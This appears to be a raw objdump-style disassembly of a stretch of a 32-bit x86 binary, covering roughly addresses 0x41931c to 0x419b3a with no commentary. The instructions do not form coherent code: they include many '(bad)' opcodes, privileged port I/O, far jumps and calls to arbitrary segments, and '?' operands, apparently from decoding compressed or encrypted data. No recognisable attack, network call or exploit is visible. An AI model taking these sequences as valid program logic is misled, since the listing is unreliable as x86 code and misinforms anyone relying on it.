  41931b:	leave  
  41931c:	ror    BYTE PTR [ebp-0x42df3e46],0xd0
  419323:	mov    bl,0x2b
  419325:	mov    al,0xef
  419327:	cmp    DWORD PTR [edx],esi
  419329:	test   BYTE PTR [edi+0x1bcf1865],cl
  41932f:	jp     0x419362
  419331:	fs out dx,eax
  419333:	sahf   
  419334:	sbb    al,0x7
  419336:	add    DWORD PTR [eax],ebx
  419338:	dec    ebx
  419339:	(bad)  [edi-0x7e]
  41933c:	pop    es
  41933d:	or     eax,0x614ed1a3
  419342:	dec    esp
  419343:	loop   0x41933e
  419345:	popf   
  419346:	fist   WORD PTR [eax]
  419348:	popf   
  419349:	adc    dh,BYTE PTR [edi]
  41934b:	adc    al,BYTE PTR [esi+0x3]
  41934e:	mov    bh,0x44
  419350:	add    edi,edx
  419352:	lock cmp al,0x5c
  419355:	lods   al,BYTE PTR ds:[esi]
  419356:	imul   esp,DWORD PTR [eax],0xffffffe0
  419359:	lods   al,BYTE PTR ds:[esi]
  41935a:	out    0xa8,eax
  41935c:	aas    
  41935d:	stos   DWORD PTR es:[edi],eax
  41935e:	pusha  
  41935f:	lods   al,BYTE PTR ds:[esi]
  419360:	mov    eax,0x434c0279
  419365:	add    ah,BYTE PTR [edx-0x57fc1d54]
  41936b:	es cli 
  41936d:	and    dh,BYTE PTR [edi]
  41936f:	fsubr  QWORD PTR [edi-0xd53eb28]
  419375:	into   
  419376:	xor    BYTE PTR [edx+0x21d74c2c],0xa9
  41937d:	in     al,0xe
  41937f:	stos   BYTE PTR es:[edi],al
  419380:	les    ebx,FWORD PTR [edi+esi*8+0x8aad6ec]
  419387:	mov    gs,WORD PTR [edx-0x2809cccc]
  41938d:	call   0xf3ea6b55
  419392:	test   ebx,edx
  419394:	sub    al,0x8c
  419396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419397:	mov    ch,0x12
  419399:	iret   
  41939a:	(bad)  
  41939b:	pop    eax
  41939c:	popf   
  41939d:	jbe    0x419331
  41939f:	jae    0x4193ed
  4193a1:	xlat   BYTE PTR ds:[ebx]
  4193a2:	push   edx
  4193a3:	push   edi
  4193a4:	mov    ecx,0x300e41eb
  4193a9:	inc    edi
  4193aa:	in     eax,dx
  4193ab:	cmp    al,0xc4
  4193ad:	xor    BYTE PTR [ecx-0x36edef8b],0xd1
  4193b4:	clc    
  4193b5:	or     DWORD PTR es:[ebx+0x24],esi
  4193b9:	gs adc eax,0xbef0bb51
  4193bf:	jns    0x419398
  4193c1:	cmp    dh,BYTE PTR [ebp+0x26]
  4193c4:	stos   BYTE PTR es:[edi],al
  4193c5:	(bad)  
  4193c6:	ss mov cl,0xd2
  4193c9:	cwde   
  4193ca:	in     al,0xc8
  4193cc:	loopne 0x419396
  4193ce:	push   edi
  4193cf:	sub    DWORD PTR [eax-0x1a61d784],eax
  4193d5:	xor    ah,BYTE PTR [ebp+0x18]
  4193d8:	inc    esp
  4193d9:	cmp    BYTE PTR [eax+eiz*1-0xe],dh
  4193dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193de:	cli    
  4193df:	cs fs ds xor ebx,edi
  4193e4:	mov    dh,0x2f
  4193e6:	retf   
  4193e7:	popa   
  4193e8:	sub    al,0x11
  4193ea:	ret    0xd5c
  4193ed:	out    dx,al
  4193ee:	pop    ecx
  4193ef:	and    eax,0x86acb6d5
  4193f4:	sbb    esi,DWORD PTR [edx]
  4193f6:	inc    ebx
  4193f7:	ss clc 
  4193f9:	jns    0x4193ac
  4193fb:	jns    0x419448
  4193fd:	inc    eax
  4193fe:	and    BYTE PTR [edi],cl
  419400:	(bad)  
  419401:	jp     0x41947e
  419403:	test   DWORD PTR [edi],ecx
  419405:	sub    bl,BYTE PTR ds:0x12e0efb3
  41940b:	pop    ss
  41940c:	test   BYTE PTR [esi],bh
  41940e:	out    dx,eax
  41940f:	mov    edi,0x235a6551
  419414:	aad    0x9e
  419416:	iret   
  419417:	jae    0x41945a
  419419:	in     eax,dx
  41941a:	jge    0x41946e
  41941c:	nop
  41941d:	xor    edx,DWORD PTR [edx+eiz*4+0x6325628]
  419424:	pushf  
  419425:	mov    esi,0x51f80a3b
  41942a:	sub    al,0xae
  41942c:	ja     0x4193e7
  41942e:	mov    ebp,0xe0667e38
  419433:	pushf  
  419434:	(bad)  
  419435:	jge    0x41942b
  419437:	inc    ebp
  419438:	sub    DWORD PTR [edi+0x986b841],ecx
  41943e:	imul   ecx,DWORD PTR [edi],0xd15763ff
  419444:	dec    esp
  419445:	ret    0x8cc6
  419448:	sbb    al,0x5a
  41944a:	lds    esi,FWORD PTR [edx+ebp*8]
  41944d:	arpl   WORD PTR [edi-0xa],si
  419450:	retf   0x40d9
  419453:	test   eax,esi
  419455:	pop    ss
  419456:	sbb    BYTE PTR [ecx+0x2b],bh
  419459:	mov    es,ecx
  41945b:	call   0x620f:0x83955c71
  419462:	ret    0x338d
  419465:	lds    ebp,FWORD PTR [edx+ecx*8]
  419468:	jmp    0x41940d
  41946a:	mov    al,ds:0xcb47069
  41946f:	bound  eax,QWORD PTR [edx]
  419471:	scas   eax,DWORD PTR es:[edi]
  419472:	xor    edx,DWORD PTR [ebx+ecx*2]
  419475:	or     eax,0xab4e5695
  41947a:	sbb    edi,DWORD PTR [eax-0x57a42bd]
  419480:	fldcw  WORD PTR [ecx+0x6a1b1aad]
  419486:	in     al,dx
  419487:	push   edi
  419488:	jl     0x419416
  41948a:	dec    eax
  41948b:	push   ecx
  41948c:	inc    edx
  41948d:	jmp    0xc05619ae
  419492:	not    DWORD PTR [eax+0x1d]
  419495:	retf   0x4186
  419498:	cld    
  419499:	cmc    
  41949a:	and    ebp,DWORD PTR [ebx+0x22b481d1]
  4194a0:	dec    edi
  4194a1:	dec    edx
  4194a2:	popa   
  4194a3:	ins    BYTE PTR es:[edi],dx
  4194a4:	pop    edi
  4194a5:	jo     0x419519
  4194a7:	xchg   bl,dl
  4194a9:	pop    ebp
  4194aa:	jge    0x419509
  4194ac:	sub    al,0xdb
  4194ae:	add    eax,0x312f1289
  4194b3:	in     eax,dx
  4194b4:	imul   esi,DWORD PTR [edi+0x1263596],0xffffffcf
  4194bb:	mov    ecx,0x9b9c47ad
  4194c0:	inc    eax
  4194c1:	popa   
  4194c2:	cmp    DWORD PTR [ecx+ebx*4+0x509ba24],0x29255d3d
  4194cd:	sbb    edi,0x11b14edc
  4194d3:	std    
  4194d4:	retf   0xf095
  4194d7:	(bad)  
  4194d8:	mov    ecx,DWORD PTR [esi-0x7f]
  4194db:	mov    eax,ds:0xb9138bde
  4194e0:	dec    edx
  4194e1:	pop    esi
  4194e2:	rcl    DWORD PTR [edx+edx*8],cl
  4194e5:	sti    
  4194e6:	inc    ebp
  4194e7:	repnz lds edi,FWORD PTR [esi]
  4194ea:	fldenv [edi+0x25]
  4194ed:	dec    ebp
  4194ee:	jmp    0x6149:0x243795b6
  4194f5:	out    dx,al
  4194f6:	cmp    eax,0x8a86135f
  4194fb:	(bad)  
  4194fd:	scas   eax,DWORD PTR es:[edi]
  4194fe:	(bad)  
  4194ff:	or     bh,dl
  419501:	lods   al,BYTE PTR ds:[esi]
  419502:	call   0x274:0xa76847db
  419509:	(bad)  
  41950a:	in     al,dx
  41950b:	stos   BYTE PTR es:[edi],al
  41950c:	les    ebx,FWORD PTR [ebx+0x65]
  41950f:	cli    
  419510:	stc    
  419511:	std    
  419512:	pop    ebp
  419513:	and    ecx,edi
  419515:	push   0xffffffeb
  419517:	out    dx,al
  419518:	pop    ebp
  419519:	cwde   
  41951a:	test   DWORD PTR [ebp-0xb],0x67c79a85
  419521:	mov    edi,0x3f882aff
  419526:	xchg   edi,eax
  419527:	dec    ebp
  419528:	stos   BYTE PTR es:[edi],al
  419529:	and    edi,DWORD PTR [ebx+0x2d8cb01]
  41952f:	xchg   esp,eax
  419530:	lahf   
  419531:	or     BYTE PTR cs:0x35663828,cl
  419538:	sub    ebp,esi
  41953a:	std    
  41953b:	and    DWORD PTR [esi],ebp
  41953d:	cld    
  41953e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41953f:	and    DWORD PTR [eax],edx
  419541:	in     eax,0x70
  419543:	xchg   edx,eax
  419544:	and    al,0x23
  419546:	fild   WORD PTR [edi]
  419548:	cli    
  419549:	adc    DWORD PTR [esi+0x23],ecx
  41954c:	cdq    
  41954d:	ins    BYTE PTR es:[edi],dx
  41954e:	mov    ebx,0x9c89b66c
  419553:	fisubr DWORD PTR [ecx]
  419555:	mov    BYTE PTR [ebp-0x40729204],bl
  41955b:	adc    al,0xae
  41955e:	mov    bh,0xe4
  419560:	push   ss
  419561:	xor    eax,0x16dd5947
  419566:	pop    esp
  419567:	mov    fs,WORD PTR [ecx-0x1e]
  41956a:	push   cs
  41956b:	das    
  41956c:	cs loope 0x4195bc
  41956f:	std    
  419570:	mov    dh,0x12
  419572:	dec    ebp
  419573:	ror    BYTE PTR [ebp+0x4b432806],cl
  419579:	icebp  
  41957a:	inc    ecx
  41957b:	mov    ds:0x8276de82,eax
  419580:	mov    DWORD PTR [esi],0xe2e71c33
  419586:	call   0x7ab4:0xcf2fd5d3
  41958d:	fs jmp 0x41956f
  419590:	lea    edi,[edx+ecx*4]
  419593:	into   
  419594:	or     DWORD PTR [edi+0x58],ebp
  419597:	gs (bad) 
  419599:	jmp    0x95036fb8
  41959e:	dec    ebp
  41959f:	aas    
  4195a0:	push   cs
  4195a1:	sub    DWORD PTR [edx],edi
  4195a3:	mov    dh,0xb7
  4195a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4195a6:	ds jne 0x4195af
  4195a9:	shl    DWORD PTR ds:0x90ab34e3,cl
  4195af:	push   es
  4195b0:	push   0x6e4be31f
  4195b5:	fwait
  4195b6:	aas    
  4195b7:	jmp    0x89cca337
  4195bc:	jl     0x4195ed
  4195be:	addr16 das 
  4195c0:	adc    ebp,DWORD PTR [edi-0x74]
  4195c3:	jmp    0x854c:0xee8abeec
  4195ca:	test   al,0x55
  4195cc:	test   cl,dh
  4195ce:	clc    
  4195cf:	cwde   
  4195d0:	cmp    ah,BYTE PTR [eax]
  4195d2:	mov    bh,0xbe
  4195d4:	iret   
  4195d5:	addr16 (bad) 
  4195d7:	push   eax
  4195d8:	ror    DWORD PTR [eax-0x1a5d34dd],1
  4195de:	cli    
  4195df:	mov    eax,ds:0xf5983fbd
  4195e4:	sahf   
  4195e5:	div    DWORD PTR [eax]
  4195e7:	pop    edx
  4195e8:	lock out dx,al
  4195ea:	inc    esi
  4195eb:	mov    fs,WORD PTR [eax+ecx*8+0x28ba355a]
  4195f2:	pop    ss
  4195f3:	add    ah,BYTE PTR [ecx+0x14]
  4195f6:	sar    BYTE PTR [edi+eiz*2],cl
  4195f9:	pop    ebp
  4195fa:	shl    DWORD PTR [esi+0x5827b5b8],cl
  419600:	jb     0x419617
  419602:	mov    esp,0x573fcf22
  419607:	ins    DWORD PTR es:[edi],dx
  419608:	push   ebx
  419609:	aaa    
  41960a:	fchs   
  41960c:	jno    0x4195c1
  41960e:	fistp  WORD PTR [ebx]
  419610:	jg     0x419638
  419612:	cmp    edx,DWORD PTR ds:0xe001a17f
  419618:	mov    ds:0x5fe26703,eax
  41961d:	or     al,0x78
  41961f:	dec    eax
  419620:	inc    ecx
  419621:	ins    DWORD PTR es:[edi],dx
  419622:	scas   eax,DWORD PTR es:[edi]
  419623:	outs   dx,BYTE PTR ds:[esi]
  419624:	add    al,0x9a
  419626:	stos   DWORD PTR es:[edi],eax
  419627:	push   ss
  419628:	mov    dh,0xff
  41962a:	imul   ebx,edx,0xf3328b78
  419630:	lods   eax,DWORD PTR ds:[esi]
  419631:	or     eax,0xf3120504
  419636:	loop   0x419634
  419638:	push   ebp
  419639:	jp     0x419693
  41963b:	test   al,0x73
  41963d:	sar    esp,1
  41963f:	pop    ss
  419640:	out    0xd2,eax
  419642:	push   eax
  419643:	loope  0x419661
  419645:	jmp    0x2e5e:0xdf355108
  41964c:	mov    bl,0xae
  41964e:	mov    ecx,0x579b26
  419653:	out    dx,eax
  419654:	test   eax,ecx
  419656:	mov    ds:0x310e69c4,eax
  41965b:	cmp    eax,0xf245a76a
  419660:	mov    dl,0x91
  419662:	adc    dh,BYTE PTR [ecx+edx*8-0x34f0771d]
  419669:	mov    DWORD PTR [ebx],esi
  41966b:	xchg   ecx,eax
  41966c:	mov    esp,0x25b8c2d3
  419671:	inc    ebp
  419672:	inc    ebx
  419673:	xor    al,0x3a
  419675:	xor    BYTE PTR [eax],al
  419677:	ret    0x6aba
  41967a:	call   0x8a47:0x8cb7f19e
  419681:	jae    0x4196ee
  419683:	adc    DWORD PTR [edx+0x210166ea],esp
  419689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41968a:	ja     0x419662
  41968c:	add    ebx,DWORD PTR [ecx]
  41968e:	(bad)  
  41968f:	mov    cl,0xb0
  419691:	dec    edx
  419692:	inc    eax
  419693:	stos   DWORD PTR es:[edi],eax
  419694:	out    0xfa,al
  419696:	out    0x1f,eax
  419698:	sub    ebp,DWORD PTR [ebx]
  41969a:	jno    0x4196f2
  41969c:	mov    ch,0x3c
  41969e:	sbb    BYTE PTR [edx+0x0],0xc0
  4196a2:	mov    eax,0x6cc330ef
  4196a7:	xor    al,0xcc
  4196a9:	inc    esi
  4196aa:	addr16 cmp eax,0x180ebefa
  4196b0:	call   FWORD PTR [edx-0x37e4887d]
  4196b6:	mov    ds:0x4b484325,eax
  4196bb:	(bad)  
  4196bc:	cld    
  4196bd:	iret   
  4196be:	sbb    eax,0x9a799526
  4196c3:	xor    eax,0x98651073
  4196c8:	adc    eax,0x6aece6bf
  4196cd:	dec    esi
  4196ce:	push   ebx
  4196cf:	neg    DWORD PTR [esi+0x53f9dbe9]
  4196d5:	adc    al,0x98
  4196d7:	sar    DWORD PTR [edi+eiz*8-0x6eab8e6e],1
  4196de:	(bad)  
  4196df:	test   BYTE PTR [ebp+0x42],0xba
  4196e3:	std    
  4196e4:	mov    dl,0xaa
  4196e6:	jns    0x419739
  4196e8:	fucomi st,st(4)
  4196ea:	test   eax,0xcc366f85
  4196ef:	gs je  0x419736
  4196f2:	bound  esp,QWORD PTR [esi]
  4196f4:	lds    esi,FWORD PTR [esi-0x58b0f88b]
  4196fa:	sub    eax,0x4fec46e1
  4196ff:	add    al,0x89
  419701:	or     bl,BYTE PTR [edx-0x480b37f4]
  419707:	popf   
  419708:	push   0xffffffce
  41970a:	mov    ds:0xd510f23e,eax
  41970f:	adc    al,0x6a
  419711:	(bad)  
  419712:	cmp    DWORD PTR [ecx],ebp
  419714:	(bad)  
  419715:	push   edx
  419716:	and    dh,BYTE PTR [ebx+0x13]
  419719:	mov    bl,0x36
  41971b:	jmp    0x63b39529
  419720:	pop    ecx
  419721:	out    0xc4,al
  419723:	jmp    0x636cf732
  419728:	mov    edx,0xc6f870ab
  41972d:	or     eax,DWORD PTR [ebx]
  41972f:	mov    eax,0xe98db279
  419734:	dec    edi
  419735:	xor    DWORD PTR [ebp+0x55a3922d],0x15315d13
  41973f:	ret    
  419740:	cmp    edx,0xccfd0994
  419746:	call   0xa54f:0xff05cc43
  41974d:	and    eax,0x1f9285ac
  419752:	loope  0x4197c9
  419754:	pop    edx
  419755:	or     ebx,edi
  419757:	inc    esp
  419758:	out    0xad,al
  41975a:	jbe    0x4196fb
  41975c:	sub    esi,DWORD PTR [ebp+0x74]
  41975f:	jnp    0x4197aa
  419761:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419762:	adc    bl,cl
  419764:	js     0x41978b
  419766:	cld    
  419767:	cld    
  419768:	test   eax,0x12fcd0aa
  41976d:	push   ecx
  41976e:	mov    ds:0xe09bc99e,al
  419773:	pop    es
  419774:	into   
  419775:	leave  
  419776:	push   es
  419777:	xchg   DWORD PTR [esi+0x3092fc17],esi
  41977d:	mov    eax,0x372a7d1f
  419782:	mov    ebp,0x53f3cbab
  419787:	(bad)  
  419789:	sbb    BYTE PTR ds:[ebx],dl
  41978c:	jecxz  0x4197eb
  41978e:	or     al,0x5d
  419790:	adc    ecx,DWORD PTR [ebp-0x5ad81060]
  419796:	cs cli 
  419798:	pop    esp
  419799:	(bad)  
  41979a:	dec    edi
  41979b:	mov    al,0x8e
  41979d:	lea    esi,[eax+0x33]
  4197a0:	sub    al,0xd9
  4197a2:	pusha  
  4197a3:	test   BYTE PTR [esi+0x33d33caf],bh
  4197a9:	pop    esi
  4197aa:	and    esp,edi
  4197ac:	add    ebx,DWORD PTR [ecx+0x1f8939c4]
  4197b2:	adc    ebp,DWORD PTR [ecx-0x2e]
  4197b5:	inc    ebp
  4197b6:	adc    eax,0xec098595
  4197bb:	pop    esi
  4197bc:	lds    eax,FWORD PTR [eax-0x79c8df2b]
  4197c2:	inc    edi
  4197c3:	jmp    0xa75a:0xcb1d333
  4197ca:	fild   DWORD PTR [edx+0x17]
  4197cd:	int3   
  4197ce:	push   esp
  4197cf:	xchg   ecx,eax
  4197d0:	out    0xe8,al
  4197d2:	inc    ecx
  4197d3:	and    dh,BYTE PTR [eax]
  4197d5:	jl     0x4197d7
  4197d7:	(bad)
  4197db:	sahf   
  4197dc:	or     al,0xfa
  4197de:	sbb    BYTE PTR [ebp-0x15],dh
  4197e1:	push   edi
  4197e2:	and    BYTE PTR [ebp-0xd],ch
  4197e5:	mov    WORD PTR [edi],gs
  4197e7:	xchg   esi,eax
  4197e8:	xor    esp,DWORD PTR [edx]
  4197ea:	ret    0xb8c7
  4197ed:	les    ebp,FWORD PTR [esi+0x7e]
  4197f0:	ret    0x122
  4197f3:	sbb    cl,dh
  4197f5:	stc    
  4197f6:	retf   0x7859
  4197f9:	cmp    dl,cl
  4197fb:	stos   DWORD PTR es:[edi],eax
  4197fc:	push   edx
  4197fd:	push   0x7a
  4197ff:	mov    al,ds:0xafc49adb
  419804:	or     DWORD PTR ds:0xedcd68b7,eax
  41980a:	mov    al,0x71
  41980c:	xchg   edi,eax
  41980d:	loopne 0x41979a
  41980f:	push   es
  419810:	cmp    ah,BYTE PTR [eax+eiz*8-0x75]
  419814:	or     eax,0x8efc65c1
  419819:	sbb    eax,0x7d26ec15
  41981e:	inc    ebp
  41981f:	xchg   edx,eax
  419820:	retf   0x5733
  419823:	dec    edx
  419824:	sti    
  419825:	dec    eax
  419826:	leave  
  419827:	outs   dx,BYTE PTR ds:[esi]
  419828:	mov    ch,0x14
  41982a:	int3   
  41982b:	adc    al,0x34
  41982d:	push   0x8c0d4473
  419832:	cmp    esi,ebp
  419834:	jns    0x41981a
  419836:	(bad)  
  419837:	fs test al,0xae
  41983a:	add    DWORD PTR [edi],eax
  41983c:	fisttp QWORD PTR [ecx-0x75]
  41983f:	repz mov edx,0xf5f24bfd
  419845:	adc    eax,0xc03bdbe1
  41984a:	cs mov bl,0x87
  41984d:	fadd   QWORD PTR [ebx-0x1bd72e1e]
  419853:	or     DWORD PTR [esi-0x4b359773],edx
  419859:	dec    ebp
  41985a:	pop    edx
  41985b:	test   DWORD PTR [eax-0x7c6cc2b0],ecx
  419861:	sbb    BYTE PTR [ecx],0x3e
  419864:	xchg   edx,eax
  419865:	in     al,dx
  419866:	pop    es
  419867:	inc    eax
  419868:	gs add eax,0xa0f477e4
  41986e:	sub    DWORD PTR [edx+0x70328fec],eax
  419874:	jnp    0x4198bd
  419876:	push   0x81480729
  41987b:	and    eax,0x99426cb5
  419880:	(bad)
  419884:	mov    al,0x6b
  419886:	js     0x4198f3
  419888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419889:	jno    0x41985c
  41988b:	cld    
  41988c:	dec    eax
  41988d:	outs   dx,DWORD PTR ds:[esi]
  41988e:	or     ebx,DWORD PTR [eax]
  419890:	xor    al,0xda
  419892:	mov    BYTE PTR [edx-0x2e],bl
  419895:	mov    al,0x86
  419897:	pop    esi
  419898:	push   cs
  419899:	stc    
  41989a:	in     eax,0xbc
  41989c:	pop    ebx
  41989d:	mov    eax,DWORD PTR [edx]
  41989f:	xchg   BYTE PTR [edx+0x4d],al
  4198a2:	out    dx,eax
  4198a3:	push   0x87187cdc
  4198a8:	push   es
  4198a9:	test   BYTE PTR [ecx-0x72],bh
  4198ac:	mov    ds:0xdb052054,al
  4198b1:	ins    BYTE PTR es:[edi],dx
  4198b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4198b3:	retf   
  4198b4:	out    dx,al
  4198b5:	push   edx
  4198b6:	int3   
  4198b7:	sbb    ch,BYTE PTR [edx+0x0]
  4198ba:	adc    dl,BYTE PTR [esi+0x20679c6]
  4198c0:	leave  
  4198c1:	jne    0x419883
  4198c3:	add    edx,DWORD PTR [edi]
  4198c5:	and    dl,bl
  4198c7:	dec    ecx
  4198c8:	stc    
  4198c9:	jmp    0x4198ff
  4198cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198cc:	xor    ebp,eax
  4198ce:	ror    BYTE PTR [ecx-0x3ec388f8],1
  4198d4:	cmp    dl,0xcd
  4198d7:	adc    dh,0x91
  4198da:	dec    ebp
  4198db:	cmp    ebp,eax
  4198dd:	sub    cl,BYTE PTR [eax-0x4c69b8c6]
  4198e3:	ins    BYTE PTR es:[edi],dx
  4198e4:	in     eax,0x43
  4198e6:	cmp    eax,0xaa2747dc
  4198eb:	std    
  4198ec:	jp     0x419937
  4198ee:	push   0xc2161aee
  4198f3:	mov    esi,0x490ed160
  4198f8:	mov    al,ds:0xa9cecc01
  4198fd:	mov    ebp,0x7bf889a7
  419902:	cs push es
  419904:	or     BYTE PTR [edx+edx*8+0x43e1dafc],ah
  41990b:	or     ebp,ebp
  41990d:	xchg   edi,eax
  41990e:	mov    WORD PTR [eax],ss
  419910:	dec    ecx
  419911:	(bad)  
  419912:	xchg   ebx,eax
  419913:	cmp    al,0x70
  419915:	inc    ebp
  419916:	cli    
  419917:	inc    esi
  419918:	ror    edi,0x60
  41991b:	dec    edx
  41991c:	inc    ebp
  41991d:	mov    ch,0x9b
  41991f:	push   ss
  419920:	jge    0x419901
  419922:	mov    WORD PTR [edx+0x5925fde9],ds
  419928:	mov    bh,0x87
  41992a:	mov    ?,ecx
  41992c:	jo     0x419928
  41992e:	(bad)  
  41992f:	in     al,0x6f
  419931:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419932:	xlat   BYTE PTR ds:[ebx]
  419933:	mov    BYTE PTR [ecx+0x5cf40a37],bl
  419939:	pop    es
  41993a:	adc    al,0xf0
  41993c:	xchg   ecx,eax
  41993d:	mov    es,WORD PTR [edi+ebx*1-0x60ff59a4]
  419944:	ds inc edx
  419946:	xchg   esp,eax
  419947:	dec    esp
  419948:	aam    0xf0
  41994a:	aaa    
  41994b:	mov    cl,0x6
  41994d:	clc    
  41994e:	sub    eax,0x8ed89447
  419953:	fxch   st(3)
  419955:	adc    eax,0xbc888a3e
  41995a:	cmc    
  41995b:	push   ds
  41995c:	cmp    DWORD PTR [eax+0x34],ebx
  41995f:	in     eax,0xa4
  419961:	mov    esp,0x3fae26ef
  419966:	icebp  
  419967:	lock mov ecx,0x82743cdc
  41996d:	push   ebp
  41996e:	or     eax,0x94d49103
  419973:	mov    ebx,0x1365f7b5
  419978:	sub    BYTE PTR [ebx+0x6776640e],dl
  41997e:	mov    ah,0xf1
  419980:	pop    ds
  419981:	outs   dx,DWORD PTR ds:[esi]
  419982:	repnz hlt 
  419984:	ret    0xf5c2
  419987:	call   0xe4b6:0x183c5900
  41998e:	rol    DWORD PTR [ecx+0x14],1
  419991:	inc    esi
  419992:	jns    0x419959
  419994:	mov    eax,0xb45a8fb7
  419999:	retf   0x5a90
  41999c:	sbb    ax,0xb8d8
  4199a0:	shl    BYTE PTR [eax+0x41810531],1
  4199a6:	(bad)  
  4199a8:	mov    ecx,0x9b996abe
  4199ad:	int3   
  4199ae:	mov    DWORD PTR [esi-0x6aca744d],ebx
  4199b4:	mov    dh,0x2f
  4199b6:	cmp    al,0x77
  4199b8:	jo     0x4199cc
  4199ba:	add    BYTE PTR [esi],ch
  4199bc:	int    0x1d
  4199be:	enter  0x55af,0xe6
  4199c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199c3:	addr16 or eax,0xdec20532
  4199c9:	cmp    ebp,DWORD PTR [edx]
  4199cb:	inc    ebp
  4199cc:	add    BYTE PTR [ecx-0x5d3150c7],bl
  4199d2:	fsub   DWORD PTR [ebx-0x3a]
  4199d5:	xor    eax,0xe9ab3e40
  4199da:	je     0x4199ed
  4199dc:	fisub  WORD PTR [ecx-0x23]
  4199df:	sub    DWORD PTR [ebp-0x4f73c413],ebx
  4199e5:	enter  0x7129,0x2
  4199e9:	mov    edx,0x46df846
  4199ee:	fs pushf 
  4199f0:	jmp    0x419a3d
  4199f2:	mov    al,0x8f
  4199f4:	xor    ch,cl
  4199f6:	or     DWORD PTR [esi],esi
  4199f8:	aam    0xf3
  4199fa:	jmp    0xe1b9:0x2563ec73
  419a01:	adc    al,0x63
  419a03:	neg    BYTE PTR [ecx+0x69]
  419a06:	test   al,0x26
  419a08:	xor    dl,ch
  419a0a:	pop    edx
  419a0b:	add    eax,DWORD PTR [edi+0x58]
  419a0e:	ret    0x3fe2
  419a11:	jle    0x419a53
  419a13:	frstor [esi-0x2c]
  419a16:	sub    al,0x97
  419a18:	clc    
  419a19:	ret    0xa47c
  419a1c:	push   ss
  419a1d:	and    DWORD PTR [eax],eax
  419a1f:	push   ss
  419a20:	xrelease mov BYTE PTR [esi],cl
  419a23:	bnd jne 0x419a0d
  419a26:	xchg   BYTE PTR [ecx],al
  419a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a29:	cli    
  419a2a:	std    
  419a2b:	adc    edi,DWORD PTR [ebx-0x66]
  419a2e:	sub    al,cl
  419a30:	xor    BYTE PTR [eax-0x46],dh
  419a33:	cs stos BYTE PTR es:[edi],al
  419a35:	out    0x38,al
  419a37:	popf   
  419a38:	and    al,0x3b
  419a3a:	daa    
  419a3b:	cmp    cl,0xd4
  419a3e:	fisttp WORD PTR [ebp-0x3f4e54f6]
  419a44:	xchg   ebp,eax
  419a45:	(bad)  
  419a46:	out    dx,eax
  419a47:	or     bh,BYTE PTR [edi+0x21]
  419a4a:	test   eax,0x63cd08cc
  419a4f:	lea    edi,[ebp+0x4b5a549a]
  419a55:	addr16 mov al,ds:0xb9
  419a59:	mov    ebp,0x8aade959
  419a5e:	add    BYTE PTR [esi+eiz*2],cl
  419a61:	int3   
  419a62:	xchg   edi,eax
  419a63:	sbb    al,0x2e
  419a65:	sbb    BYTE PTR [edx+ebx*2+0x718b8b6e],ah
  419a6c:	sub    edi,DWORD PTR [edx+0x2]
  419a6f:	push   ss
  419a70:	icebp  
  419a71:	mov    bl,0x9c
  419a73:	dec    ebp
  419a74:	and    esi,0x9afc0e84
  419a7a:	cmp    eax,edx
  419a7c:	adc    ch,BYTE PTR ds:0x332b27be
  419a82:	test   eax,0x4219a7a1
  419a87:	scas   al,BYTE PTR es:[edi]
  419a88:	jecxz  0x419add
  419a8a:	and    BYTE PTR [edx],0xdf
  419a8d:	mov    ds:0x371368be,al
  419a92:	std    
  419a93:	and    DWORD PTR ds:0xf0cc9075,0xfa30e378
  419a9d:	test   BYTE PTR [eax+0x151aa446],ch
  419aa3:	jne    0x419b04
  419aa5:	mov    ?,edx
  419aa7:	in     al,dx
  419aa8:	xchg   esp,eax
  419aa9:	push   edi
  419aaa:	(bad)  
  419aab:	jns    0x419ac1
  419aad:	mov    ah,0xbc
  419aaf:	push   0xabe377a0
  419ab4:	inc    edi
  419ab5:	jp     0x419ae3
  419ab7:	(bad)  
  419ab8:	fidivr DWORD PTR [edi+edi*1-0x5e]
  419abc:	popf   
  419abd:	push   es
  419abe:	push   ebp
  419abf:	xchg   ebp,eax
  419ac0:	sahf   
  419ac1:	mov    bl,0x46
  419ac3:	hlt    
  419ac4:	(bad)  
  419ac5:	jns    0x419abc
  419ac7:	retf   
  419ac8:	ret    
  419ac9:	mov    ah,0xc7
  419acb:	fdiv   QWORD PTR [eax+0x18]
  419ace:	dec    ebp
  419acf:	retf   
  419ad0:	ja     0x419a79
  419ad2:	fdivr  st(1),st
  419ad4:	in     eax,0x47
  419ad6:	inc    edi
  419ad7:	inc    edi
  419ad8:	sar    BYTE PTR [edx+0x2589817d],cl
  419ade:	pop    ss
  419adf:	stos   BYTE PTR es:[edi],al
  419ae0:	out    0x98,al
  419ae2:	daa    
  419ae3:	lods   eax,DWORD PTR ds:[esi]
  419ae4:	mov    dl,BYTE PTR [eax]
  419ae6:	push   0xffffffb6
  419ae8:	call   0xa3de:0xa47d4f4b
  419aef:	inc    ecx
  419af0:	push   cs
  419af1:	ret    
  419af2:	sbb    al,0x61
  419af4:	in     eax,0xaf
  419af6:	sbb    al,0x7a
  419af8:	xor    al,0xbb
  419afa:	pop    edx
  419afb:	ret    0x1d2b
  419afe:	popf   
  419aff:	dec    edx
  419b00:	sbb    eax,0x3fa9ba4e
  419b05:	test   eax,edx
  419b07:	sbb    dl,bh
  419b09:	and    eax,0x39cb27f7
  419b0e:	mov    ss,WORD PTR [edx-0x6d396252]
  419b14:	mov    gs,WORD PTR [edi-0x6]
  419b17:	arpl   WORD PTR [edx+0x41],si
  419b1a:	sbb    ah,bh
  419b1c:	and    DWORD PTR ds:0x479a2a3a,edx
  419b22:	add    eax,0x2c80d30
  419b27:	pop    esp
  419b28:	xchg   BYTE PTR [ebx-0x7bed9c5e],al
  419b2e:	in     al,0x5c
  419b30:	jo     0x419b40
  419b32:	pop    esi
  419b33:	leave  
  419b34:	or     bh,BYTE PTR ds:0xaee0da97
  419b3a:	sub    DWORD PTR [ecx+0x1b],esi
